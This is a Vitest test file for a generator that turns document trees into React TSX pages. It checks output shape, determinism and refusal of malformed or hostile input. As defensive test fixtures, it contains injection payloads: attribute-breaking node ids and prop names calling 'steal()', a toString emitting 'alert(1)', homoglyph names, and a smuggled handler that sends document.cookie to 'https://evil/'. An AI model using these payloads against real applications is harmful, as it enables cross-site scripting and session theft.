import { expect, test } from "vitest";
import type { Doc, Manifest, Op, PropValue } from "@noon/contracts";
import { applyOp, applyOpInto, emptyDoc, ROOT_ID, validate } from "@noon/doc-model";
import { randomOp, seeded } from "@noon/doc-model/random-ops";
import { testManifest as manifest } from "@noon/doc-model/fixtures";
import { generate } from "./index.ts";

const add = (nodeId: string, parentId: string, component = "Stack", props: Record<string, PropValue> = {}, index = 0): Op => ({ type: "add_node", nodeId, parentId, index, component, props });
const build = (...ops: Op[]): Doc => ops.reduce(applyOp, emptyDoc());

/** The generated file, or a thrown error naming the reason: every test below wants one or the other. */
const tsx = (doc: Doc, m: Manifest = manifest): string => {
  const result = generate(doc, m);
  if (!result.ok) throw new Error(`${result.reason}: ${result.detail}`);
  return result.tsx;
};
const refusal = (doc: Doc, m: Manifest = manifest): string => {
  const result = generate(doc, m);
  return result.ok ? "generated" : result.reason;
};

// --- the fixed shape -------------------------------------------------------------------------

test("a document becomes one file: a banner, the imports it uses, and the page component", () => {
  const doc = build(add("s", ROOT_ID), add("b", "s", "Button", { label: "Pay" }));
  expect(tsx(doc)).toBe(
    `// Generated from the document by @noon/codegen. Do not edit: the sandbox overwrites it.

import { Button, Stack } from "../design-system/index.ts";

export function Page() {
  return (
    <div data-node-id="root">
      <Stack data-node-id="s">
        <Button data-node-id="b" label={"Pay"} />
      </Stack>
    </div>
  );
}
`,
  );
});

test("an empty document still generates the page component, with no import line", () => {
  expect(tsx(emptyDoc())).toBe(
    `// Generated from the document by @noon/codegen. Do not edit: the sandbox overwrites it.

export function Page() {
  return (
    <div data-node-id="root" />
  );
}
`,
  );
});

test("the file exports the page component and nothing else", () => {
  const doc = build(add("s", ROOT_ID), add("b", "s", "Button", { label: "Pay" }));
  // Fast Refresh keeps React state only while the module exports components alone: one extra
  // export (a BUILD_ID, say) turns every edit into a full page reload (learning-tests/sandbox).
  const exports = tsx(doc).match(/^export\b.*$/gmu) ?? [];
  expect(exports).toEqual(["export function Page() {"]);
});

test("every element carries its node id", () => {
  const doc = build(add("s", ROOT_ID), add("b", "s", "Button", { label: "Pay" }), add("inner", "s", "Stack", {}, 1));
  const file = tsx(doc);
  const openingTags = file.match(/<[A-Za-z]/gu) ?? [];
  const ids = file.match(/data-node-id="/gu) ?? [];
  expect(openingTags).toHaveLength(4); // div(root) + Stack + Button + Stack
  expect(ids).toHaveLength(openingTags.length);
  expect(file).toContain(`<div data-node-id="root">`);
  expect(file).toContain(`<Button data-node-id="b" label={"Pay"} />`);
});

test("only the components the document actually uses are imported", () => {
  const doc = build(add("b", ROOT_ID, "Button", { label: "Pay" }));
  expect(tsx(doc)).toContain(`import { Button } from "../design-system/index.ts";`);
  expect(tsx(doc)).not.toContain("Stack");
});

test("the import line is in name order, not the order the tree happens to reach the components", () => {
  const stackFirst = build(add("s", ROOT_ID), add("b", "s", "Button", { label: "Pay" }), add("a", "s", "Alert", {}, 1));
  const alertFirst = build(add("a", ROOT_ID, "Alert"), add("s", ROOT_ID, "Stack", {}, 1), add("b", "s", "Button", { label: "Pay" }));
  const line = `import { Alert, Button, Stack } from "../design-system/index.ts";`;
  expect(tsx(stackFirst)).toContain(line);
  expect(tsx(alertFirst)).toContain(line);
});

// --- values ----------------------------------------------------------------------------------

test("each prop kind is written as a JSX expression, so no text ever needs HTML escaping", () => {
  const doc = build(add("s", ROOT_ID, "Stack", { gap: 16, direction: "row" }), add("b", "s", "Button", { label: 'a "quoted" \\ {brace} <tag>', disabled: true }));
  const file = tsx(doc);
  expect(file).toContain(`<Stack data-node-id="s" direction={"row"} gap={16}>`);
  expect(file).toContain(`<Button data-node-id="b" disabled={true} label={"a \\"quoted\\" \\\\ {brace} <tag>"} />`);
});

test("props are written in name order, whatever order they were set in", () => {
  const forwards = build(add("s", ROOT_ID), { type: "set_prop", nodeId: "s", key: "gap", value: 4 }, { type: "set_prop", nodeId: "s", key: "direction", value: "row" });
  const backwards = build(add("s", ROOT_ID), { type: "set_prop", nodeId: "s", key: "direction", value: "row" }, { type: "set_prop", nodeId: "s", key: "gap", value: 4 });
  expect(Object.keys(forwards.nodes["s"]?.props ?? {})).not.toEqual(Object.keys(backwards.nodes["s"]?.props ?? {}));
  expect(tsx(forwards)).toBe(tsx(backwards));
  expect(tsx(forwards)).toContain(`<Stack data-node-id="s" direction={"row"} gap={4} />`);
});

test("a prop set back to its default is written out, because absent and default are different documents", () => {
  const doc = build(add("s", ROOT_ID, "Stack", { gap: 8 }));
  expect(tsx(doc)).toContain("gap={8}");
});

// --- determinism ------------------------------------------------------------------------------

test("the same document always generates byte-identical TSX", () => {
  const doc = build(add("s", ROOT_ID, "Stack", { gap: 16 }), add("b", "s", "Button", { label: "Pay" }));
  expect(tsx(doc)).toBe(tsx(doc));
});

test("two documents built by different op orders that end in the same state generate the same bytes", () => {
  const oneWay = build(
    add("a", ROOT_ID, "Stack", { gap: 1 }),
    add("b", ROOT_ID, "Stack", { gap: 2 }, 1),
    add("x", "a", "Button", { label: "x" }),
    add("y", "b", "Button", { label: "y" }),
  );
  const otherWay = build(
    add("b", ROOT_ID, "Stack", {}),
    add("y", "b", "Button", { label: "y" }),
    add("a", ROOT_ID, "Stack", {}, 0),
    add("x", "a", "Button", { label: "x" }),
    { type: "set_prop", nodeId: "b", key: "gap", value: 2 },
    { type: "set_prop", nodeId: "a", key: "gap", value: 1 },
  );
  // The two documents hold the same tree stored in a different key order: that is the whole point.
  expect(Object.keys(oneWay.nodes)).not.toEqual(Object.keys(otherWay.nodes));
  expect(tsx(oneWay)).toBe(tsx(otherWay));
});

test("generation walks the tree from the root and never the key order of doc.nodes", () => {
  const doc = build(add("a", ROOT_ID), add("b", ROOT_ID, "Stack", {}, 1));
  // Same tree, nodes re-keyed in the opposite order. A generator that iterated doc.nodes would flip.
  const reversed: Doc = { rootId: doc.rootId, nodes: Object.fromEntries(Object.entries(doc.nodes).reverse()) };
  expect(Object.keys(reversed.nodes)).not.toEqual(Object.keys(doc.nodes));
  expect(tsx(reversed)).toBe(tsx(doc));
  expect(tsx(doc).indexOf(`"a"`)).toBeLessThan(tsx(doc).indexOf(`"b"`));
});

test("a tree deeper than any call stack is generated by iterating, not by recursing", () => {
  const doc = emptyDoc();
  let parent = ROOT_ID;
  for (let i = 0; i < 20_000; i++) {
    const id = `n${String(i)}`;
    applyOpInto(doc, add(id, parent));
    parent = id;
  }
  expect(tsx(doc).match(/data-node-id=/gu) ?? []).toHaveLength(20_001);
});

// --- drift: the design system changed under a document that already exists ---------------------

test.each<[string, Doc, string]>([
  ["a component the design system no longer has", build(add("s", ROOT_ID), add("gone", "s", "Carousel")), "unknown_component"],
  ["a prop the component no longer has", withProps("s", { colour: "red" }), "unknown_prop"],
  ["a prop whose type changed", withProps("s", { gap: "wide" }), "wrong_prop_type"],
  ["an enum value that is no longer an option", withProps("s", { direction: "diagonal" }), "wrong_prop_type"],
  ["a required prop the node never had", build(add("b", ROOT_ID, "Button", {})), "missing_required_prop"],
  ["children under a component that takes none", childrenUnder("Button"), "parent_takes_no_children"],
  ["a root that is not the reserved page component", rootNode({ component: "Stack" }), "malformed_doc"],
  ["props on the root", rootNode({ props: { gap: 1 } }), "malformed_doc"],
  ["a child id that is not in the document", rootNode({ children: ["ghost"] }), "malformed_doc"],
  ["a node reachable twice", sharedChild(), "malformed_doc"],
  ["a node id that could close the attribute it sits in", hostileNodeId(), "malformed_doc"],
])("refuses to generate: %s", (_name, doc, reason) => {
  expect(refusal(doc)).toBe(reason);
});

test("a manifest whose prop name is not an identifier cannot reach the generated file", () => {
  const hostile: Manifest = { version: 1, components: [{ name: "Stack", acceptsChildren: true, props: [{ name: 'gap"; onLoad="steal()', type: { kind: "number" }, required: false }] }] };
  expect(refusal(withProps("s", { 'gap"; onLoad="steal()': 1 }), hostile)).toBe("malformed_doc");
});

test("a manifest whose component name is not an identifier cannot reach the generated file", () => {
  const hostile: Manifest = { version: 1, components: [{ name: "Stack/*", acceptsChildren: true, props: [] }] };
  const doc: Doc = { rootId: "root", nodes: { root: { id: "root", component: "Page", props: {}, parentId: null, children: ["s"] }, s: { id: "s", component: "Stack/*", props: {}, parentId: "root", children: [] } } };
  expect(refusal(doc, hostile)).toBe("malformed_doc");
});

test("a document that is valid against the manifest is always generated", () => {
  const doc = build(add("s", ROOT_ID, "Stack", { gap: 16, direction: "row" }), add("b", "s", "Button", { label: "Pay", disabled: false }));
  expect(generate(doc, manifest).ok).toBe(true);
});

// --- a prop that is there and is not there -----------------------------------------------------
// JSON cannot carry `undefined`, so these documents cannot arrive over the wire. They can arrive
// from memory: a structuredClone, a snapshot loader that does not parse. `Object.hasOwn` says the
// prop is present and reading it says it is not, which is how a prop gets dropped while ok stays true.

test("a prop whose value is undefined is refused, never quietly left out of the file", () => {
  // The dangerous half: this one COMPILES without the prop, so epic 5 would read the file back and
  // delete `gap` from the document. A prop the document holds must never vanish on the way to code.
  expect(refusal(withProps("s", { gap: undefined as never, direction: "row" }))).toBe("malformed_doc");
});

test("a required prop whose value is undefined is refused, not reported as present", () => {
  const doc = childOf("b", "Button", { label: undefined as never });
  expect(refusal(doc)).toBe("malformed_doc"); // Object.hasOwn sees `label`; the file would not have it
});

// --- the page component's own name is reserved --------------------------------------------------

test("a design system that exports a component called Page is refused, not imported beside the page function", () => {
  // `import { Page }` next to `export function Page()` is TS2440. Nothing else in the pipeline
  // reserves the name: Manifest.parse accepts it and validate() now refuses the add_node.
  const withPage: Manifest = { version: 1, components: [...manifest.components, { name: "Page", acceptsChildren: true, props: [] }] };
  expect(refusal(childOf("p", "Page", {}), withPage)).toBe("reserved_component");
});

// --- the generator trusts nothing about a value ------------------------------------------------

test("a prop type nothing can judge is refused, not treated as judged and fine", () => {
  // A manifest that skipped Manifest.parse. checkProp used to fall off the end of its switch and
  // return undefined, which every caller reads as "this value is fine": the object below would then
  // have been written into the file by String(), as source code nobody asked for.
  const exotic = { version: 1, components: [{ name: "Stack", acceptsChildren: true, props: [{ name: "gap", type: { kind: "int" }, required: false }] }] } as unknown as Manifest;
  const smuggled = { toString: () => `0} onClick={() => fetch("https://evil/" + document.cookie)} x={0` };
  expect(refusal(withProps("s", { gap: smuggled as never }), exotic)).toBe("wrong_prop_type");
});

test.each([["NaN", Number.NaN], ["Infinity", Number.POSITIVE_INFINITY], ["-Infinity", Number.NEGATIVE_INFINITY]])("a number that is not finite is refused: %s", (_name, value) => {
  // String(NaN) is the bare identifier `NaN`, which compiles and is not the document's value.
  expect(refusal(withProps("s", { gap: value }))).toBe("malformed_doc");
});

test("every prop is checked, not only the first one in name order", () => {
  // `align` sorts before `gap`, so a generator that stopped after the first prop would pass this.
  expect(refusal(withProps("s", { direction: "row", gap: "wide" }))).toBe("wrong_prop_type");
});

// --- totality: a reason, never an exception ----------------------------------------------------
// The caller is a queue handler. A throw there is a job that fails as `internal`; a reason is
// something the user can read. Every one of these is a document no op could ever produce.

test.each<[string, unknown]>([
  ["a node with no props at all", { rootId: "root", nodes: { root: { id: "root", component: "Page", parentId: null, children: [] } } }],
  ["props that are null", rootNode({ props: null as never })],
  ["children that are not an array", rootNode({ children: { length: 1 } as never })],
  ["children that are a number", rootNode({ children: 5 as never })],
  ["children that are null", rootNode({ children: null as never })],
  ["children that are a string", rootNode({ children: "ab" as never })],
  ["no nodes map at all", { rootId: "root" }],
  ["a nodes map that is null", { rootId: "root", nodes: null }],
  ["a props bag whose getter throws", propsThatThrow()],
  ["a root that has a parent", rootNode({ parentId: "somebody" })],
])("returns a reason rather than throwing: %s", (_name, doc) => {
  const result = generate(doc as Doc, manifest);
  expect(result).toMatchObject({ ok: false });
});

// --- boundaries of the two names that become code ----------------------------------------------

test.each([["a dot", "a.b"], ["a space", "a b"], ["empty", ""], ["a slash", "a/b"]])("a node id containing %s is refused", (_name, id) => {
  expect(refusal(nodeNamed(id))).toBe("malformed_doc");
});

test("a node id that is also a name on Object.prototype is read from the document, not from the prototype", () => {
  // The contract refuses these ids, so this document skipped it. `constructor` is an OWN key here,
  // so it is a real node; the danger is a lookup that would find Object.prototype.constructor when
  // it is NOT an own key, which is why nodeOf exists.
  expect(tsx(nodeNamed("constructor"))).toContain(`<Stack data-node-id="constructor" />`);
  expect(refusal(rootNode({ children: ["constructor"] }))).toBe("malformed_doc"); // no own key: not a node
});

test.each([["a hyphen", "data-x"], ["a dollar-free unicode letter", "аlign"], ["a dot", "a.b"]])("a manifest prop name containing %s cannot reach the generated file", (_name, name) => {
  const hostile: Manifest = { version: 1, components: [{ name: "Stack", acceptsChildren: true, props: [{ name, type: { kind: "number" }, required: false }] }] };
  expect(refusal(withProps("s", { [name]: 1 }), hostile)).toBe("malformed_doc");
});

test("a manifest component name that only LOOKS like an identifier cannot reach the generated file", () => {
  const cyrillic = "Сtack"; // a Cyrillic Es, not a Latin C
  const hostile: Manifest = { version: 1, components: [{ name: cyrillic, acceptsChildren: false, props: [] }] };
  expect(refusal(childOf("s", cyrillic, {}), hostile)).toBe("malformed_doc");
});

// --- indentation ---------------------------------------------------------------------------------

test("indentation follows the depth, and stops stepping right at the cap", () => {
  const doc = emptyDoc();
  let parent = ROOT_ID;
  for (let i = 0; i < 70; i++) {
    const id = `n${String(i)}`;
    applyOpInto(doc, add(id, parent));
    parent = id;
  }
  const indents = (tsx(doc).match(/^ *<Stack/gmu) ?? []).map((line) => line.length - line.trimStart().length);
  expect(indents[5]).toBe(2 * (6 + 2)); // the node at depth 6 (n5): two spaces per level
  expect(Math.max(...indents)).toBe(2 * 66); // and never more than the cap, however deep it goes
  expect(indents.filter((n) => n === 2 * 66).length).toBeGreaterThan(1); // the cap is really reached, by several
});

// --- the property that kills every future silent drop ------------------------------------------

test("whenever a document is generated, the file names exactly the props the document holds", () => {
  const random = seeded(20260921);
  let doc = emptyDoc();
  let generated = 0;
  for (let i = 0; i < 4000; i++) {
    const op = randomOp(random, doc);
    if (validate(doc, op, manifest).ok) doc = applyOp(doc, op);
    if (i % 20 !== 0) continue;
    const result = generate(doc, manifest);
    if (!result.ok) throw new Error(`${result.reason}: ${result.detail}`); // a valid document must always generate
    generated++;
    for (const node of Object.values(doc.nodes)) {
      if (node.parentId === null) continue;
      const line = result.tsx.split("\n").find((l) => l.includes(`data-node-id="${node.id}"`));
      const written = [...(line ?? "").matchAll(/ ([A-Za-z_$][A-Za-z0-9_$]*)=\{/gu)].map((m) => m[1]);
      expect(written.sort()).toEqual(Object.keys(node.props).sort());
    }
  }
  expect(generated).toBeGreaterThan(100);
});

// --- found by the E4.1 verifier, each by running it ----------------------------------------------

test("a component name that is not a string cannot say one thing to the check and another to the file", () => {
  // Converted to a string once for the identifier check and again for the file: a toString that
  // answers "Button" first and code after that got through, and the file ran `alert(1)`.
  let calls = 0;
  const liar = { toString: () => (calls++ < 1 ? "Button" : "Button />; alert(1); <Button") } as unknown as string;
  const hostile: Manifest = { version: 1, components: [{ name: liar, acceptsChildren: false, props: [{ name: "label", type: { kind: "string" }, required: true }] }] };
  expect(refusal(childOf("b", liar, { label: "x" }), hostile)).toBe("malformed_doc");
});

test("-0 is written as -0: validate accepts it, so the file must carry it, not a different number", () => {
  expect(tsx(withProps("s", { gap: -0 }))).toContain("gap={-0}");
});

test("a prop that is not enumerable is refused, not dropped: the file would lose a prop the document holds", () => {
  const props = Object.defineProperty({}, "label", { value: "hi", enumerable: false }) as Record<string, PropValue>;
  expect(refusal(childOf("b", "Button", props))).toBe("malformed_doc");
});

test("a prop keyed by a Symbol is refused, not dropped", () => {
  expect(refusal(withProps("s", { [Symbol("gap")]: 4 }))).toBe("malformed_doc");
});

test.each<[string, () => unknown]>([
  ["an exception with no prototype", () => Object.create(null) as unknown],
  ["an exception that throws when asked what it is", () => new Proxy({}, { getPrototypeOf: () => { throw new Error("no"); } })],
  ["an Error whose message throws", () => Object.defineProperty(new Error(), "message", { get: () => { throw new Error("no"); } })],
])("the safety net holds even when what it catches cannot be described: %s", (_name, thrown) => {
  const doc = { rootId: "root", get nodes(): never { throw thrown(); } } as unknown as Doc;
  expect(generate(doc, manifest)).toMatchObject({ ok: false, reason: "malformed_doc" });
});

test("the reason's detail is always a string, even when the exception's message is not", () => {
  const thrown = Object.assign(new Error(), { message: { toString: () => "x" } });
  const doc = { rootId: "root", get nodes(): never { throw thrown; } } as unknown as Doc;
  const result = generate(doc, manifest);
  expect(result.ok ? undefined : typeof result.detail).toBe("string");
});

test("a very wide document is generated, not called malformed because a helper spread its children into a call", () => {
  const doc = emptyDoc();
  const root = doc.nodes[ROOT_ID];
  if (!root) throw new Error("no root");
  for (let i = 0; i < 200_000; i++) {
    const id = `w${String(i)}`;
    doc.nodes[id] = { id, component: "Stack", props: {}, parentId: ROOT_ID, children: [] };
    root.children.push(id);
  }
  expect(generate(doc, manifest).ok).toBe(true);
});

// --- fixtures that deliberately break a rule ---------------------------------------------------

/** One node of any component under the root, written straight in: this is what drift looks like. */
function childOf(nodeId: string, component: string, props: Record<string, PropValue>): Doc {
  return {
    rootId: "root",
    nodes: {
      root: { id: "root", component: "Page", props: {}, parentId: null, children: [nodeId] },
      [nodeId]: { id: nodeId, component, props, parentId: "root", children: [] },
    },
  };
}

/** A Stack under the root whose id is whatever the caller wants, however impossible. */
function nodeNamed(id: string): Doc {
  return childOf(id, "Stack", {});
}

/** A props bag that cannot be read: nothing an op can make, and nothing generate() may throw on. */
function propsThatThrow(): Doc {
  const props = {};
  Object.defineProperty(props, "gap", { enumerable: true, get: () => { throw new Error("no"); } });
  return childOf("s", "Stack", props);
}


/** A Stack under the root whose props are written straight in, bypassing the ops that would refuse them. */
function withProps(nodeId: string, props: Record<string, PropValue>): Doc {
  return childOf(nodeId, "Stack", props);
}

/** A document that is nothing but a root, with one of the root's own fields replaced. */
function rootNode(override: Partial<Doc["nodes"][string]>): Doc {
  return { rootId: "root", nodes: { root: { id: "root", component: "Page", props: {}, parentId: null, children: [], ...override } } };
}

/** A node parked under a component whose manifest entry says it takes no children. */
function childrenUnder(component: string): Doc {
  return {
    rootId: "root",
    nodes: {
      root: { id: "root", component: "Page", props: {}, parentId: null, children: ["p"] },
      p: { id: "p", component, props: { label: "Pay" }, parentId: "root", children: ["c"] },
      c: { id: "c", component: "Stack", props: {}, parentId: "p", children: [] },
    },
  };
}

/** One node listed as the child of two parents: a shape no op can produce and checkDoc refuses. */
function sharedChild(): Doc {
  return {
    rootId: "root",
    nodes: {
      root: { id: "root", component: "Page", props: {}, parentId: null, children: ["a", "b"] },
      a: { id: "a", component: "Stack", props: {}, parentId: "root", children: ["c"] },
      b: { id: "b", component: "Stack", props: {}, parentId: "root", children: ["c"] },
      c: { id: "c", component: "Stack", props: {}, parentId: "a", children: [] },
    },
  };
}

/** The contract refuses this id; a snapshot written before that rule would not. It must not become code. */
function hostileNodeId(): Doc {
  const id = 'x" onLoad="steal()';
  return {
    rootId: "root",
    nodes: {
      root: { id: "root", component: "Page", props: {}, parentId: null, children: [id] },
      [id]: { id, component: "Stack", props: {}, parentId: "root", children: [] },
    },
  };
}
